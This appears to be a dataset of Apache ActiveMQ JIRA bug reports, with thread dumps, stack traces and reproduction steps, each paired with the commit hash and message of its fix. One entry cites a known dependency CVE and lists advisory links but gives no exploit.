    at org.apache.activemq.broker.region.AbstractRegion.destroySubscription(AbstractRegion.java:488)
    at org.apache.activemq.broker.jmx.ManagedTopicRegion.destroySubscription(ManagedTopicRegion.java:52)
    at org.apache.activemq.broker.region.AbstractRegion.removeConsumer(AbstractRegion.java:480)
    at org.apache.activemq.broker.region.TopicRegion.removeConsumer(TopicRegion.java:206)
    at org.apache.activemq.broker.region.RegionBroker.removeConsumer(RegionBroker.java:429)
    at org.apache.activemq.broker.jmx.ManagedRegionBroker.removeConsumer(ManagedRegionBroker.java:258)
    at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:139)
    at org.apache.activemq.advisory.AdvisoryBroker.removeConsumer(AdvisoryBroker.java:352)
    at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:139)
    at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:139)
    at org.apache.activemq.broker.BrokerFilter.removeConsumer(BrokerFilter.java:139)
    at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:729)
    at org.apache.activemq.broker.TransportConnection.processRemoveSession(TransportConnection.java:768)
    at org.apache.activemq.broker.TransportConnection.processRemoveConnection(TransportConnection.java:879)
    - locked <0x00000007ac999f00> (a org.apache.activemq.broker.jmx.ManagedTransportConnection)
    at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:73)
    at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:330)
    at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:194)
*****   at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:45)
    at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:301)
    at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:97)
    at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:202)
    at org.apache.activemq.transport.stomp.ProtocolConverter.onStompDisconnect(ProtocolConverter.java:838)
    at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:267)
    at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
    at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
    at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
    at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
    at java.lang.Thread.run(Thread.java:748)
""ActiveMQ Transport: tcp:///127.0.0.1:58302@61613"":
    at sun.misc.Unsafe.park(Native Method)
    - parking to wait for  <0x00000007ac872730> (a java.util.concurrent.locks.ReentrantLock$NonfairSync)
    at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)
    at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836)
    at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:870)
    at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1199)
    at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:209)
    at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:285)
*****   at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:66)
    at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1486)
    at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:971)
    at org.apache.activemq.broker.TransportConnection.dispatchSync(TransportConnection.java:927)
    at org.apache.activemq.broker.region.TopicSubscription.dispatch(TopicSubscription.java:715)
+++++   at org.apache.activemq.broker.region.TopicSubscription.add(TopicSubscription.java:121)
    - locked <0x00000007acc44708> (a java.lang.Object)
    at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:48)
    at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:775)
    at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:556)
    - locked <0x00000007acbd4e08> (a org.apache.activemq.broker.region.Topic)
    at org.apache.activemq.broker.region.Topic.send(Topic.java:484)
    at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:505)
    at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:459)
    at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:293)
    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:154)
    at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
    at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:293)
    at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:154)
    at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:572)
    at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:768)
    at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:330)
    at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:194)
    at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:45)
    at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:301)
    at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:97)
    at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:202)
    at org.apache.activemq.transport.stomp.ProtocolConverter.onStompSend(ProtocolConverter.java:345)
    at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:248)
    at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
    at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
    at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
    at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
    at java.lang.Thread.run(Thread.java:748)


In reviewing how MQTT and AMQP were handled, both set ""consumerInfo.setDispatchAsync(true);""

AMQPSession line 376
MQTTDefualtSubscriptionStrategy line 61

For MQTT fix see the below cards:

ENTMQ-1504
https://issues.jboss.org/browse/ENTMQ-1504?_sscc=t

AMQ-5290
https://issues.apache.org/jira/browse/AMQ-5290 https://github.com/apache/activemq/blame/master/activemq-mqtt/src/main/java/org/apache/activemq/transport/mqtt/strategy/MQTTDefaultSubscriptionStrategy.java#L61 

I believe we can fix this for Stomp in ProtocolConverter, line 614, by also setting consumerInfo.setDispatchAsync(true); This would bring Stomp into alignment with the other protocols and how they were fixed.

I'll be providing a patch with the above change shortly.",46160c7b7f66d9d5dda05d2e2dc45e993d3cc48e,[AMQ-7011] Override dispatch to always set dispatchAsync true
13166389,AMQ-6990,"ActiveMQ 5.15.4 commons-beanutils-core-1.8.0.jar which has one high severity CVE against it.
Discovered by adding OWASP Dependency check into ActiveMQ pom.xml and running the OWASP report.

CVE-2014-0114 Severity:High CVSS Score: 7.5 (AV:N/AC:L/Au:N/C:P/I:P/A:P)
CWE: CWE-20 Improper Input Validation
Apache Commons BeanUtils, as distributed in lib/commons-beanutils-1.8.0.jar in Apache Struts 1.x through 1.3.10 and in other products requiring commons-beanutils
through 1.9.2, does not suppress the class property, which allows remote attackers to ""manipulate"" the ClassLoader and execute arbitrary code via the class parameter, as
demonstrated by the passing of this parameter to the getClass method of the ActionForm object in Struts 1.
BID - 67121
BUGTRAQ - 20141205 NEW: VMSA-2014-0012 - VMware vSphere product updates address security vulnerabilities
CONFIRM - http://advisories.mageia.org/MGASA-2014-0219.html
CONFIRM - http://commons.apache.org/proper/commons-beanutils/javadocs/v1.9.2/RELEASE-NOTES.txt
CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21674128
CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21674812
CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21675266
CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21675387
CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21675689
CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21675898
CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21675972
CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21676091
CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21676110
CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21676303
CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21676375
CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21676931
CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg21677110
CONFIRM - http://www-01.ibm.com/support/docview.wss?uid=swg27042296
CONFIRM - http://www.ibm.com/support/docview.wss?uid=swg21675496
CONFIRM - http://www.oracle.com/technetwork/security-advisory/cpujan2018-3236628.html
CONFIRM - http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html
CONFIRM - http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html
CONFIRM - http://www.oracle.com/technetwork/topics/security/cpujan2015-1972971.html
CONFIRM - http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html
CONFIRM - http://www.oracle.com/technetwork/topics/security/cpuoct2014-1972960.html
CONFIRM - http://www.vmware.com/security/advisories/VMSA-2014-0008.html
CONFIRM - http://www.vmware.com/security/advisories/VMSA-2",7e50428495b5e57a5b612a68c3beab4e09ce9d6d,"AMQ-6990 - Exclude commons-beanutils-core

Thank you to Jamie Goodyear for the patch"
13141522,AMQ-6906,"When a prepared xa transaction with acks is rolledback after recovery, the message in the store is available for redelivery however it may have been skipped and the cursor will ignore till restart.
When the cache is disabled and there are further message sends it is possible to reproduce.",51ec4590eba2fc379cd4665ae3bf993298b92d5b,[AMQ-6906] exclude test from leveldb scenario dependent on tracked recovered acks
13139063,AMQ-6901,"Back in AMQ-6109 I fixed an issue where the wrong policy was being applied to a destination. when there were wildcards.  It turns out that this was only a partial fix and there is another edge case where if there are multiple wild card policies (and some are children) , it is possible for the wrong child card policy to be applied to a destination at a higher parent level which is incorrect.",703b7b151017fe117363e5598146e157bad78265,AMQ-6901 - Add NPE check inside DestinationMap filter
13133738,AMQ-6891,"I have following scenario (see attached test case):
 # Send 1 message in JMS transaction
 # Enable database problem simulation (throw {{SQLException}} in {{TransactionContext.executeBatch()}} method - the similar situation should happen, when commit fails)
 # Attempt to send 2 messages in one JMS transaction, send operation fails as is expected (only 1 message is in database from first send operation)
 # Disable database problem simulation ({{SQLException}} is not thrown from now)
 # Repeat the attempt to send ""the same"" 2 messages in one JMS transaction, send operation is successful now, how is expected (3 messages are in database)
 # Attempt to receive 3 messages 1, 2, 3, but 5 messages are received 1, 2, 3, 2, 3.

I have suspicion, that problem is in {{org.apache.activemq.broker.region.Queue}}. It seems that reason is {{indexOrderedCursorUpdates}} list. The {{Queue.onAdd(MessageContext)}} method is invoked for each message by {{JDBCMessageStore.addMessage(ConnectionContext, Message) method}}, which adds {{MessageContext}} into this list. The added {{MessageContext}} is processed (and removed) in {{Queue.doPendingCursorAdditions()}} method, which is invoked only from ""afterCommit synchronization"" ({{Queue.CursorAddSync.afterCommit()}} method). But when commit operation fails, then ""afterCommit"" method is not invoked (but {{afterRollback}} method is invoked) and {{MessageContext}} entries stays in {{indexOrderedCursorUpdates}} list.

Personaly I would expect, that some ""remove"" operation should be done in {{Queue.CursorAddSync.afterRolback()}} method. Probably the similar operation should be done in {{Queue.doMessageSend()}} method on place, where {{Exception}} from ""addMessage"" is handled in case when JMS transaction is not used. Or some different ""completion"" operation should be introduced, because {{MessageContext}} is only add into the list,  but don't removed in case of failure.

When I tried to register (and use) {{LeaseLockerIOExceptionHandler}} IOExceptionHandler, the transports was successfully restarted, but my ""client"" code was blocked in {{ActiveMQSession.commit()}} method. Is it expected behavior?

When I tried to add following code into {{Queue.CursorAddSync.afterRollback()}}, I received only 3 expected messages (when JMS transaction is used), but it was only blind shot, sorry, because I don't understand the whole logic here.
{code:java}
@Override
public void afterRollback() throws Exception {
  synchronized(indexOrderedCursorUpdates) {
    for(int i = indexOrderedCursorUpdates.size() - 1; i >= 0; i--) {
      MessageContext mc = indexOrderedCursorUpdates.get(i);
        if(mc.message.getMessageId().equals(messageContext.message.getMessageId())) {
        indexOrderedCursorUpdates.remove(mc);
        if(mc.onCompletion != null) {
          mc.onCompletion.run();
        }
        break;
      }
    }
  }
  messageContext.message.decrementReferenceCount();
}
{code}
 ",f96a20e831755505b31df2e14fd3266f74d5a149,[AMQ-6891] apply fix and test from Radek Kraus with thanks. Pending cursor adds are now dropped on rollback
13108264,AMQ-6833,"Currently the DirContext is only closed in case of errors, in case of success the connection is held open until it times out.",a1e87c60963d7ac736aad01786dc6026fe2c3ac3,[AMQ-6833] Cleanly close DirContext in LDAPLoginModule when the authentication is complete
13097283,AMQ-6798,"Our services create queues on broker. It queues exists in 1 day then they become inactive, cause clients turned off. Active mq removes them by Inactivity timeout 60 seconds. But memory consumption of broker grows permanently. We acquired heap dump, and saw that org.apache.activemq.usage.StoreUsage contains 2.7 millions of object with 1.5 gb. That objects belongs to StoreUsage of queues. 

I don't sure that we uses broker as it should be used. Maybe we shouldn't create new queues. But this behavior is stranged for me.",35bd3ad938f5c378b17a34980d2f3480bf3bbfc3,"AMQ-6798 - Clean up store usage object on Queue stop

When queues are stopped the StoreUsage object needs to be stopped so it
will be removed from the parent StoreUsage.  This allows the object to
be garbage collected and prevents a memory leak."
13094081,AMQ-6792,"With a blocked socket write, the failover (use for masterslave) transport holds the reconnect mutex. this blocks normal stop pending the completion of the write. If the write blocks and there is no timeout exception, the transport stays up in error even when stop is called on the network bridge which can block broker shutdown.

Threads:
{code}""ActiveMQ BrokerService[amq10] Task-147"" - Thread t@45016
   java.lang.Thread.State: RUNNABLE
	at java.net.SocketOutputStream.socketWrite0(Native Method)
	at java.net.SocketOutputStream.__AW_socketWrite(SocketOutputStream.java:111)
	at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java)
	at java.net.SocketOutputStream.write(SocketOutputStream.java:155)
	at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431)
	at sun.security.ssl.OutputRecord.write(OutputRecord.java:417)
	at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:886)
	at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:857)
	at sun.security.ssl.AppOutputStream.__AW_write(AppOutputStream.java:123)
	- locked <5ce0bde7> (a sun.security.ssl.AppOutputStream)
	at sun.security.ssl.AppOutputStream.write(AppOutputStream.java)
	at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:115)
	at java.io.DataOutputStream.flush(DataOutputStream.java:123)
	at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:176)
	at org.apache.activemq.transport.AbstractInactivityMonitor.doOnewaySend(AbstractInactivityMonitor.java:335)
	at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:317)
	at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85)
	at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:116)
	at org.apache.activemq.transport.failover.FailoverTransport.__AW_oneway(FailoverTransport.java:667)
	- locked <47e37945> (a java.lang.Object)
	at org.apache.activemq.transport.failover.FailoverTransport.oneway(FailoverTransport.java)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)
	at org.apache.activemq.transport.ResponseCorrelator.asyncRequest(ResponseCorrelator.java:81)
	at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceLocalCommand(DemandForwardingBridgeSupport.java:1008)
	at org.apache.activemq.network.DemandForwardingBridgeSupport$2.onCommand(DemandForwardingBridgeSupport.java:207)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.vm.VMTransport.doDispatch(VMTransport.java:162)
	at org.apache.activemq.transport.vm.VMTransport.dispatch(VMTransport.java:154)
	- locked <467f411f> (a java.util.concurrent.atomic.AtomicBoolean)
	at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:131)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)
	at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
	at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1457)
	at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:971)
	at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:1017)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:133)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at java.lang.Thread.run(Thread.java:748){code}
{code}""IOExceptionHandler: stopping BrokerService[amq10]"" - Thread t@201006
   java.lang.Thread.State: BLOCKED
	at org.apache.activemq.transport.failover.FailoverTransport.__AW_stop(FailoverTransport.java:380)
	- waiting to lock <47e37945> (a java.lang.Object) owned by ""ActiveMQ BrokerService[amq10] Task-147"" t@45016
	at org.apache.activemq.transport.failover.FailoverTransport.stop(FailoverTransport.java)
	at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65)
	at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65)
	at org.apache.activemq.transport.ResponseCorrelator.stop(ResponseCorrelator.java:132)
	at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
	at org.apache.activemq.network.DemandForwardingBridgeSupport.__AW_stop(DemandForwardingBridgeSupport.java:307)
	at org.apache.activemq.network.DemandForwardingBridgeSupport.stop(DemandForwardingBridgeSupport.java)
	at org.apache.activemq.network.DiscoveryNetworkConnector.handleStop(DiscoveryNetworkConnector.java:223)
	at org.apache.activemq.network.NetworkConnector$1.doStop(NetworkConnector.java:65)
	at org.apache.activemq.util.ServiceSupport.__AW_stop(ServiceSupport.java:71)
	at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java)
	at org.apache.activemq.network.NetworkConnector.stop(NetworkConnector.java:165)
	at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
	at org.apache.activemq.broker.BrokerService.__AW_stopAllConnectors(BrokerService.java:2191)
	at org.apache.activemq.broker.BrokerService.stopAllConnectors(BrokerService.java)
	at org.apache.activemq.broker.BrokerService.__AW_stop(BrokerService.java:805)
	at org.apache.activemq.broker.BrokerService.stop(BrokerService.java)
	at org.apache.activemq.xbean.XBeanBrokerService.stop(XBeanBrokerService.java:122)
	at org.apache.activemq.util.DefaultIOExceptionHandler$2.run(DefaultIOExceptionHandler.java:181){code}
",63f0b7e20d56837b4f159e83594a4e4fb906cd4a,[AMQ-6792] fire the failover exception handler before stop to ensure blocked write does not block stop request
13093097,AMQ-6788,"I try to start an embedded broker:
        broker = new BrokerService();
        broker.setPersistenceAdapter(new MemoryPersistenceAdapter());
        broker.start();

java.lang.RuntimeException: java.lang.ClassNotFoundException: org.apache.activemq.store.kahadb.plist.PListStoreImpl

For details see:
https://apaste.info/vIkj",8646bb1010d2632f5d405fe1761c2b9c99a0a139,[AMQ-6788] Explain how to fix the problem in the exception
13091503,AMQ-6780,"After our switch of the postgres-jdbc-driver from version 9.4-1201 to 42.1.3 the JDBCPersistenceAdapter does not recognize postgres any more. 
The log:

{code:title=new driver}
2017-07-31 19:35:52,733 [INFO ] 259-949-060 [JDBCPersistenceAdapter : loadAdapter] - Database adapter driver override not found for : [postgresql_jdbc_driver].  Will use default implementation.
2017-07-31 19:35:52,765 [WARN ] 259-949-060 [DefaultJDBCAdapter : executeStatement] - Could not create JDBC tables; they could already exist. Failure was: CREATE TABLE ACTIVEMQ_MSGS(ID BIGINT NOT NULL, CONTAINER VARCHAR(250) NOT NULL, MSGID_PROD VARCHAR(250), MSGID_SEQ BIGINT, EXPIRATION BIGINT, MSG BLOB, PRIMARY KEY ( ID ) ) Message: ERROR: type ""blob"" does not exist
  Position: 147 SQLState: 42704 Vendor code: 0
{code}

{code:title=old driver}
2017-07-31 19:37:21,021 [INFO ] 11b-e48-c83 [JDBCPersistenceAdapter : loadAdapter] - Database adapter driver override recognized for : [postgresql_native_driver] - adapter: class org.apache.activemq.store.jdbc.adapter.PostgresqlJDBCAdapter
{code}

The cause is the change of the name from ""postgres_native_driver"" to ""postgres_jdbc_driver"" (getDriverName() now returns ""PostgreSQL JDBC Driver""). The PostgresqlJDBCAdapter uses the name to find the class. 
Our workaround is to add a file ""postgres_jdbc_driver"" to ""META-INF/services/org/apache/activemq/store/jdbc"" in the ""activemq-jdbc-store-5.15.0.jar"".
",46f8deeb67623e095622debac18f53d736cb3bcc,[AMQ-6780] Add PostgreSQL version JDBC driver name in jdbc store services
13091503,AMQ-6780,"After our switch of the postgres-jdbc-driver from version 9.4-1201 to 42.1.3 the JDBCPersistenceAdapter does not recognize postgres any more. 
The log:

{code:title=new driver}
2017-07-31 19:35:52,733 [INFO ] 259-949-060 [JDBCPersistenceAdapter : loadAdapter] - Database adapter driver override not found for : [postgresql_jdbc_driver].  Will use default implementation.
2017-07-31 19:35:52,765 [WARN ] 259-949-060 [DefaultJDBCAdapter : executeStatement] - Could not create JDBC tables; they could already exist. Failure was: CREATE TABLE ACTIVEMQ_MSGS(ID BIGINT NOT NULL, CONTAINER VARCHAR(250) NOT NULL, MSGID_PROD VARCHAR(250), MSGID_SEQ BIGINT, EXPIRATION BIGINT, MSG BLOB, PRIMARY KEY ( ID ) ) Message: ERROR: type ""blob"" does not exist
  Position: 147 SQLState: 42704 Vendor code: 0
{code}

{code:title=old driver}
2017-07-31 19:37:21,021 [INFO ] 11b-e48-c83 [JDBCPersistenceAdapter : loadAdapter] - Database adapter driver override recognized for : [postgresql_native_driver] - adapter: class org.apache.activemq.store.jdbc.adapter.PostgresqlJDBCAdapter
{code}

The cause is the change of the name from ""postgres_native_driver"" to ""postgres_jdbc_driver"" (getDriverName() now returns ""PostgreSQL JDBC Driver""). The PostgresqlJDBCAdapter uses the name to find the class. 
Our workaround is to add a file ""postgres_jdbc_driver"" to ""META-INF/services/org/apache/activemq/store/jdbc"" in the ""activemq-jdbc-store-5.15.0.jar"".
",dc36c19c811dcaab07c27d6f2a0dcdd90f856d3f,[AMQ-6780] This closes #311
13085971,AMQ-6765,"In the exception handling in the doStart() method of the HttpClientTransport vital debugging information is lost.

On line 282, for any encountered exception an IOException is thrown with the following message: '""Failed to perform GET on: "" + remoteUrl + "" as response was: "" + e.getMessage()'. Where e.getMessage() usually returns null.

It would be nicer if at least he http status code was logged, and maybe the stacktrace when trace is enabled.",56bed30c6427a1cc6b41e0d289a97c3e5b4582c4,"AMQ-6765 Add trace logging of start failure exception

Log the exception at trace level when start fails."
13080790,AMQ-6707,"When ActiveMQ 5.14.5 is configured with jdbc persistence storage (postgres) from time to time below error occurs:
{code}
2017-06-15 01:41:37,418 | ERROR | enerContainer-21 | CommitTask                       | 67 - org.apache.aries.transaction.manager - 1.3.1 | Unexpected exception committing org.apache.geronimo.transaction.manager.WrapperNamedXAResource@34ac9d62; continuing to commit other RMs
javax.transaction.xa.XAException: STORE COMMIT FAILED: Transaction rolled back xaErrorCode:104
	at org.apache.activemq.TransactionContext.toXAException(TransactionContext.java:793)
	at org.apache.activemq.TransactionContext.commit(TransactionContext.java:622)
	at org.apache.geronimo.transaction.manager.WrapperNamedXAResource.commit(WrapperNamedXAResource.java:54)
	at org.apache.geronimo.transaction.manager.CommitTask.run(CommitTask.java:64)
	at org.apache.geronimo.transaction.manager.TransactionImpl.commitResources(TransactionImpl.java:688)
	at org.apache.geronimo.transaction.manager.TransactionImpl.commit(TransactionImpl.java:327)
	at org.apache.geronimo.transaction.manager.TransactionManagerImpl.commit(TransactionManagerImpl.java:252)
	at org.springframework.transaction.jta.JtaTransactionManager.doCommit(JtaTransactionManager.java:1020)
	at org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:761)
	at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:730)
	at org.apache.aries.transaction.internal.AriesPlatformTransactionManager.commit(AriesPlatformTransactionManager.java:75)
	at sun.reflect.GeneratedMethodAccessor180.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)[:1.8.0_131]
	at java.lang.reflect.Method.invoke(Method.java:498)[:1.8.0_131]
	at com.ectsp.spring.osgi.PlatformTransactionManagerFactoryBean$ProxyTxManagerHandler.invoke(PlatformTransactionManagerFactoryBean.java:115)[169:ectsp-spring-osgi:1.0.0.SNAPSHOT]
	at com.sun.proxy.$Proxy68.commit(Unknown Source)[100:org.apache.servicemix.bundles.spring-tx:4.2.8.RELEASE_1]
	at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.receiveAndExecute(AbstractPollingMessageListenerContainer.java:245)[97:org.apache.servicemix.bundles.spring-jms:4.2.8.RELEASE_1]
	at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:1164)[97:org.apache.servicemix.bundles.spring-jms:4.2.8.RELEASE_1]
	at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.executeOngoingLoop(DefaultMessageListenerContainer.java:1156)[97:org.apache.servicemix.bundles.spring-jms:4.2.8.RELEASE_1]
	at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:1053)[97:org.apache.servicemix.bundles.spring-jms:4.2.8.RELEASE_1]
	at java.lang.Thread.run(Thread.java:748)[:1.8.0_131]
Caused by: javax.transaction.xa.XAException: STORE COMMIT FAILED: Transaction rolled back xaErrorCode:104
	at org.apache.activemq.transaction.Transaction.newXAException(Transaction.java:212)
	at org.apache.activemq.transaction.XATransaction.storeCommit(XATransaction.java:93)
	at org.apache.activemq.transaction.XATransaction.commit(XATransaction.java:76)
	at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:252)
	at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:118)
	at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:118)
	at org.apache.activemq.broker.TransportConnection.processCommitTransactionTwoPhase(TransportConnection.java:547)
	at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:102)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:336)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:200)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:125)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:301)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)[47:org.apache.activemq.activemq-osgi:5.14.5]
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)[47:org.apache.activemq.activemq-osgi:5.14.5]
	at java.lang.Thread.run(Thread.java:745)[:1.8.0_131]
Caused by: java.io.IOException: Could not remove prepared transaction state from message add for sequenceId: 4025171
	at org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.doCommitAddOp(DefaultJDBCAdapter.java:1031)
	at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.commitAdd(JDBCPersistenceAdapter.java:780)
	at org.apache.activemq.store.jdbc.JdbcMemoryTransactionStore$CommitAddOutcome.run(JdbcMemoryTransactionStore.java:146)
	at org.apache.activemq.store.memory.MemoryTransactionStore$Tx.commit(MemoryTransactionStore.java:101)
	at org.apache.activemq.store.memory.MemoryTransactionStore.commit(MemoryTransactionStore.java:270)
	at org.apache.activemq.transaction.XATransaction.storeCommit(XATransaction.java:86)
	... 15 more
{code}
It seams that it the same issue as in https://issues.apache.org/jira/browse/AMQ-5567.",314d5a51688186bf1a21bae0137b3e6cee407f43,AMQ-6707 - skip tracked ack dependent test for leveldb
13080038,AMQ-6703,"JMX purge clears a queue of messages but does not reset the message audit. Doing a X.copyTo(Y), X.purge() Y.copyYo(X) results in duplicate detection and messages going to the DLQ in error.
JMX purge needs to clear the message audit such that the queue is free of old state.",99f3d4c5054bbf401c6460d99574873b604e4b49,"[AMQ-6703] have jmx purge clear the audit such that messages can be copied back, fix and test"
13076830,AMQ-6697,"Reproducing the problem:
* Receive a message via STOMP (+EDIT: on a subscription with ack:client-individual+)
* Start a transaction
* ACK -(or NACK)- the message within the transaction
* Abort the transaction
* ACK (or NACK) the message

Expected behaviour:
* The message is according to step #5 either ACKed or NACKed.

Observed behaviour:
* The message is neither ACKed nor NACKed, but stays in unacknowledged state
* An exception is raised:
 org.apache.activemq.transport.stomp.ProtocolException: Unexpected ACK received for message-id [ID:(...)]
        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompAck(ProtocolConverter.java:475)
        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:250)
        at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
